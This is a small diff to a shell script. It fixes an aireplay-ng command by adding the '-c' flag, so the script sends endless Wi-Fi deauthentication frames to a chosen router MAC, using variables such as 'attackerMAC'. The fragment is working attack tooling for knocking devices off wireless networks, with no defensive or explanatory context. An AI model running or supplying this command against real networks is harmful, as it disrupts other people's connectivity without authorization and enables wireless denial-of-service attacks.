@@ -14,4 +14,4 @@ attackerMAC="00:00:00:00:00:00"
 
 # perhaps also allow more customization of deauthing
 # aireplay-ng [deauth code][# of deauths]-a[router MAC]-c[Attacker MAC][interface name]
-echo $(aireplay-ng -0 0 -a $MACAddr $attackerMAC en0)
+echo $(aireplay-ng -0 0 -a $MACAddr -c $attackerMAC en0)
